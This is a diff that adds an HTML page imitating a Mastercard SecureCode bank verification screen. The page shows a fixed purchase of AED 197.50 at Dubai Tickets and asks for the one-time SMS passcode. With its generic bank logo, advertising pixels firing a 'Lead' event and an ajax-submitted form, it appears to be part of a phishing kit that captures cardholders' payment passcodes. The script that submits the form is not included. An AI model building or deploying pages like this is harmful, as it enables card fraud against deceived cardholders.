@@ -1,0 +1,139 @@
+<html>
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Secure Code Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <link href="css/style.css" rel="stylesheet" type="text/css">
+    <script charset="utf-8" src="https://analytics.tiktok.com/i18n/pixel/static/identify_55404.js"></script>
+</head>
+
+<body class="other">
+    <div class="modal-page">
+        <div class="header">
+            <div class="bank_logo_wrapper">
+                <img class="bank-logo" src="img/altBank.png">
+            </div>
+            <div class="brand_logo_wrapper">
+                <img class="brand-logo" src="img/cardLogo/mastercard.png">
+            </div>
+        </div>
+        <form class="form_item" id="ajax-contact" method="POST" name="frm" accept-charset="utf-8">
+            <div iv="" class="codecenter">
+                <h1 id="h1_item">Enter one-time Passcode
+                </h1>
+                <div id="desc" class="desc">
+                    <p id="desc_p" class="sts">A one-time Passcode is required for this purchase. This Passcode has been
+                        sent to
+                        your registered mobile phone number.
+                    </p>
+                </div>
+                <div class="list" id="descList" style="display: block;">
+                    <div class="list-item" id="pa_merchant">
+                        <div class="label">Merchant:
+                        </div>
+                        <div class="value">Dubai Tickets</div>
+                    </div>
+                    <div class="list-item" id="pa_date">
+                        <div class="label">Date:
+                        </div>
+                        <div class="value nw1">
+                            <span class="date_day">13</span>/<span class="date_month">1</span>/<span
+                                class="date_year">2024</span>
+                        </div>
+                    </div>
+                    <div class="list-item" id="pa_pan">
+                        <div class="label">Card Number:
+                        </div>
+                        <div class="">**** **** ****
+                            <span>
+                                6431 </span>
+                        </div>
+                    </div>
+                    <div class="list-item">
+                        <div class="label">Amount:</div>
+                        <div class="value">AED 197.50</div>
+                    </div>
+                    <div class="list-item li_inp" id="inp">
+                        <div class="label">Enter One-Time Passcode:
+                        </div>
+                        <div class="value">
+                            <input class="big-input" id="psw_id" type="password" name="sms" maxlength="6" required=""
+                                autocomplete="off" onclick="iosAutoComplete();">
+                            <a class="smallie" href="javascript:void(0);" onclick="resendSMS();">Haven't received a
+                                one-time passcode?
+                            </a>
+                            <div id="countdown" class="backtimer hid">
+                                <span class="display">30
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="list">
+                    <input type="hidden" name="PSW_RENEW" value="Y">
+                    <input type="hidden" name="TRIES" value="Y">
+                    <div class="footer">
+                        <div class="row">
+                            <div class="left">
+                                <a class="cancel_btn" href="javascript:void(0);"
+                                    onclick="OnExit(); return false;">Cancel
+                                </a>
+                            </div>
+                            <div class="center">
+                                <input class="big-button" type="submit" id="btnCodeSubmit" name="btSubmit"
+                                    value="Submit" disabled="disabled">
+                            </div>
+                            <div class="right">
+                                <a class="help_btn" href="javascript:void(0);" onclick="helpPage();">
+                                    <img src="img/help.gif" class="help_icon" alt="Help" align="absbottom">Help
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <input type="hidden" name="formaction" value="pa.submit">
+            </div>
+
+            <div class="help hid">
+                <div class="desc">
+                    <p>SecureCode Verification is a free online card security program. SecureCode protects cards with a
+                        personal
+                        security passcode. If this service is activated on your card, the online stores participating in
+                        the program
+                        will redirect your
+                        browser to the Bank's website to enter your personal passcode. After checking it, the purchase
+                        will be
+                        safely paid. If the online store does not participate in the SecureCode Verification program,
+                        payment
+                        security is not guaranteed.
+                    </p>
+                    <div class="list">
+                        <div class="footer">
+                            <div class="row">
+                                <div class="">
+                                    <input id="returnBtn" onclick="comeBack()" class="big-button backlink" type="button"
+                                        name="btcComeBack" value="Return">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <input class="cnumidclass" type="hidden" name="cnumid" value="">
+        </form>
+    </div>
+    <img height="1" width="1" src="https://www.facebook.com/tr?id=&amp;ev=Lead&amp;noscript=1">
+    <script type="text/javascript" async="" src="https://analytics.tiktok.com/i18n/pixel/static/main.MTc3MGUxMzJiNA.js"
+        data-id=""></script>
+    <script type="text/javascript" async=""
+        src="https://analytics.tiktok.com/i18n/pixel/events.js?sdkid=&amp;lib=ttq"></script>
+    <script src="/js/jquery-3.6.0.js"></script>
+    <script src="js/script.js"></script>
+
+
+
+</body>
+
+</html>
